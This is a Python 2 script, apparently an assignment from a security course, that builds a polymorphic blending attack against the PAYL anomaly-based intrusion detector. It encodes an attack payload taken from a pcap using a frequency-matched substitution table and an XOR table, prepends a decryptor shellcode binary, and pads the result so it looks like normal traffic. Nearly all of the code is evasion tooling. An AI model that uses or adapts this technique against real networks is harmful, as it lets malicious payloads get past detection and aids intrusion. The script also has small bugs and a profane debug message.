#!/usr/bin/env python2
import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "artificial-profile.pcap"
ATTACKBODY_PATH = "../PAYL/test/cmin31.pcap"  # replace the file name by the one you downloaded


def get_next_mod_4(xor_table):
    m = len(xor_table) % 4
    return len(xor_table) + (4 - m)


def print_sub_table(sub_table):
    import json
    for k, v in sub_table.items():
        sub_table[k] = len(v)
    print(json.dumps(substitution_table, indent=2))


def compare_freq(artificial_payload, attack_payload):
    artificial_frequency = frequency(artificial_payload)
    attack_frequency = frequency(attack_payload)
    sorted_artificial_frequency = sorting(artificial_frequency)
    sorted_attack_frequency = sorting(attack_frequency)
    no_match = []
    match = []
    for k in attack_payload:
        if k in artificial_frequency:
            m = attack_frequency[k]
            n = artificial_frequency[k]
            d = (abs(m - n) / m) * 100
            d = round(d, 3)
            rec = (k, 'm:' + str(m), 'n:' + str(n), '%diff:' + str(d))
            if m != n and rec not in match:
                match.append(rec)
        else:
            no_match.append(k)
    print('---------Frequency Difference------------')
    for i in match:
        print(i)
    for i in no_match:
        print('nope', i)
    print('-------End Frequency Difference----------')


def check_if_valid_char(artifical_payload, raw_payload):
    for i in list(artifical_payload):
        if str(i) not in list(raw_payload):
            print('fuck', i)

def get_size(filename):
    import os

    st = os.stat(filename)
    return str(st.st_size)


if __name__ == '__main__':
    # Read in source pcap file and extract tcp payload
    attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
    artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)

    # Generate substitution table based on byte frequency in file
    substitution_table = getSubstitutionTable(artificial_payload, attack_payload)

    # Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)

    # For xor operation, should be a multiple of 4
    while len(
            xor_table) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        xor_table.append(chr(0))

    # For xor operation, should be a multiple of 4
    while len(
            adjusted_attack_body) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        adjusted_attack_body.append(chr(0))

    # Read in decryptor binary to append at the start of payload
    with open("shellcode.bin", mode='rb') as file:
        shellcode_content = file.read()

    # Prepare byte list for payload
    b_list = []
    for b in shellcode_content:
        b_list.append(b)

    # Raw payload will be constructed by encrypted attack body and xor_table
    raw_payload = b_list + adjusted_attack_body + xor_table
    while len(raw_payload) < len(artificial_payload):
        padding(artificial_payload, raw_payload)

    # Write prepared payload to Output file and test against your PAYL model
    with open("output", "w") as result_file:
        result_file.write(''.join(raw_payload))

    open('substitution table.txt', 'w')
    with open("substitution table.txt", "w") as result_file:
        result_file.write(str(substitution_table))

    open('payload.bin', 'w')
    with open('payload.bin', 'wb') as payload_file:
        payload_file.write(''.join(adjusted_attack_body + xor_table))
